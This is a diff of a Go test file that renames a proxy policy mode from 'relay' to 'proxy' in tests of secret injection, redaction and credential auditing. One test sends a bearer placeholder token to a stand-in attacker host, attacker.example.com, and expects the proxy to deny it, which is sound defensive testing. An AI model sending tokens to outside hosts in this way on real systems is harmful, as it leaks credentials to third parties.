@@ -162,7 +162,7 @@ func TestHTTPSSecretInjectionAndNonLeak(t *testing.T) {
 			},
 		},
 		Policy{
-			Mode: "relay",
+			Mode: "proxy",
 		},
 		map[string]Secret{
 			"API_TOKEN": {
@@ -244,7 +244,7 @@ func TestRedactionSurvivesFragmentedUpstreamBody(t *testing.T) {
 			DialContext: targetDialer(up.Listener.Addr().String(), nil),
 		},
 		Policy{
-			Mode: "relay",
+			Mode: "proxy",
 		},
 		map[string]Secret{
 			"API_TOKEN": {
@@ -284,12 +284,12 @@ func TestCredentialsRequireAuditAndEncodedPlaceholdersAreDenied(t *testing.T) {
 		TenantID:  "t",
 		VSockPath: "/tmp/unused",
 	}, Policy{
-		Mode: "relay",
+		Mode: "proxy",
 	}, secrets); err == nil {
 		t.Fatal("credentials activated without an audit sink")
 	}
 	m2, b := newTestManager(t, Options{}, Policy{
-		Mode: "relay",
+		Mode: "proxy",
 	}, secrets)
 	resp, _ := get(t, proxyClient(t, m2, b), "https://attacker.example.com/?token=Bearer+phantom")
 	if resp.StatusCode != 403 {
